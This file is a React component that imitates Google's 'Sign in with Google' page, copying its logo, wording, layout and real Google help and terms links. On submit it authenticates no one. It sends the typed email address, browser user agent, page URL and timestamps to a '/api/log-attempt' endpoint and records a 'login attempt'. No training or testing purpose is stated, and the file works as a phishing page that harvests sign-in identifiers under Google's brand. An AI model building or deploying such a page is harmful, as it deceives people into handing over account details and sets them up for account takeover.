import React, { useState } from "react";

const WEBHOOK_URL = "/api/log-attempt";

const accountchooser: React.FC = () => {
  const [email, setEmail] = useState("");

  const logEmailAttempt = async (emailAddress: string) => {
  try {
    const logData = {
      email: emailAddress,
      timestamp: new Date().toISOString(),
      date: new Date().toLocaleDateString(),
      time: new Date().toLocaleTimeString(),
      userAgent: navigator.userAgent,
      url: window.location.href,
    };

    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(logData),
    });

    console.log("✅ Login attempt logged successfully");
  } catch (error) {
    console.error("❌ Failed to log email attempt:", error);
  }
};

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (email.trim()) {
      await logEmailAttempt(email.trim());
    } else {
      alert("Please enter your email address.");
    }
  };

  return (
    <div
      style={{
        minHeight: "100vh",
        backgroundColor: "#f5f5f5",
        fontFamily: "Roboto, Arial, sans-serif",
        margin: 0,
        padding: 0,
        display: "flex",
        flexDirection: "column",
        justifyContent: "center",
        alignItems: "center",
      }}
    >
      <div
        style={{
          backgroundColor: "#fff",
          borderRadius: 24,
          boxShadow: "0 2px 6px rgba(60,64,67,0.12)",
          width: 1050,
          maxWidth: "100%",
          display: "flex",
          flexDirection: "column",
          boxSizing: "border-box",
          padding: 0,
        }}
      >
        <div
          style={{
            display: "flex",
            alignItems: "center",
            padding: "24px 0px 12px 32px",
            borderBottom: "1px solid #eee",
          }}
        >
          <img
            src="https://www.google.com/images/branding/product/2x/googleg_48dp.png"
            alt="Google"
            style={{ width: 22, height: 22, marginRight: 12 }}
          />
          <span
            style={{
              fontSize: 15,
              color: "#1a73e8",
              fontWeight: 500,
              letterSpacing: "0.02em",
            }}
          >
            Sign in with Google
          </span>
        </div>
        <div
          style={{
            display: "flex",
            flexDirection: "row",
            padding: "84px 70px 32px 70px",
          }}
        >
          <div
            style={{
              minWidth: 380,
              flexGrow: 1,
              display: "flex",
              flexDirection: "column",
              justifyContent: "flex-start",
              alignItems: "flex-start",
              paddingTop: 12,
            }}
          >
            <div
              style={{
                fontSize: 32,
                fontWeight: 400,
                marginBottom: 0,
                color: "#202124",
                marginTop: 0,
                letterSpacing: "0.01em",
                textAlign: "left",
              }}
            >
              Sign in
            </div>
            <div
              style={{
                marginTop: 18,
                marginBottom: 54,
                color: "#5f6368",
                fontSize: 18,
                textAlign: "left",
              }}
            >
              to continue to{" "}
              <a
                href="#"
                style={{ color: "#1a73e8", textDecoration: "none", fontWeight: 500 }}
              >
                Google
              </a>
            </div>
          </div>
          <form
            autoComplete="off"
            onSubmit={handleSubmit}
            style={{
              minWidth: 480,
              display: "flex",
              flexDirection: "column",
              justifyContent: "flex-start",
              alignItems: "flex-start",
              marginLeft: 70,
              paddingTop: 30,
            }}
          >
            <input
              type="email"
              name="email"
              placeholder="Email or phone"
              autoComplete="username"
              required
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              style={{
                width: 430,
                fontSize: 18,
                padding: 14,
                border: "1px solid #dadce0",
                borderRadius: 4,
                outline: "none",
                backgroundColor: "#fff",
                marginBottom: 7,
                marginTop: 7,
                boxSizing: "border-box",
              }}
            />
            <a
              href="#"
              style={{
                color: "#1a73e8",
                textDecoration: "none",
                fontSize: 15,
                marginTop: 10,
                display: "block",
                textAlign: "left",
              }}
            >
              Forgot email?
            </a>
            <div
              style={{
                display: "flex",
                justifyContent: "flex-end",
                alignItems: "center",
                gap: 18,
                marginTop: 44,
                width: "100%",
              }}
            >
              <a
                href="#"
                style={{
                  color: "#1a73e8",
                  textDecoration: "none",
                  fontSize: 15,
                  marginRight: 22,
                }}
              >
                Create account
              </a>
              <button
                type="submit"
                style={{
                  backgroundColor: "#e8f0fe",
                  color: "#1967d2",
                  border: "none",
                  borderRadius: 18,
                  padding: "10px 42px",
                  fontSize: 18,
                  fontWeight: 500,
                  cursor: "pointer",
                  boxShadow: "0 1px 2px rgba(60,64,67,0.08)",
                  transition: "background 0.2s",
                }}
                onMouseOver={(e) => (e.currentTarget.style.backgroundColor = "#d2e3fc")}
                onMouseOut={(e) => (e.currentTarget.style.backgroundColor = "#e8f0fe")}
              >
                Next
              </button>
            </div>
          </form>
        </div>
      </div>
      <div
        style={{
          minWidth: 1050,
          maxWidth: 1050,
          boxSizing: "border-box",
          margin: "24px auto 0 auto",
          display: "flex",
          flexDirection: "row",
          alignItems: "center",
          justifyContent: "space-between",
          padding: "0 38px",
          fontFamily: "Roboto, Arial, sans-serif",
        }}
      >
        <div style={{ fontSize: 15, color: "#5f6368", textAlign: "left" }}>
          English (United States)
        </div>
        <div style={{ textAlign: "right", fontSize: 13, color: "#5f6368" }}>
          <a
            href="https://support.google.com/accounts?hl=en&p=account_iph"
            target="_blank"
            rel="noreferrer"
            style={{ color: "#5f6368", textDecoration: "none", marginLeft: 32, fontSize: 13 }}
          >
            Help
          </a>
          <a
            href="https://accounts.google.com/TOS?loc=MK&hl=en&privacy=true"
            target="_blank"
            rel="noreferrer"
            style={{ color: "#5f6368", textDecoration: "none", marginLeft: 32, fontSize: 13 }}
          >
            Privacy
          </a>
          <a
            href="https://accounts.google.com/TOS?loc=MK&hl=en"
            target="_blank"
            rel="noreferrer"
            style={{ color: "#5f6368", textDecoration: "none", marginLeft: 32, fontSize: 13 }}
          >
            Terms
          </a>
        </div>
      </div>
    </div>
  );
};

export default accountchooser;
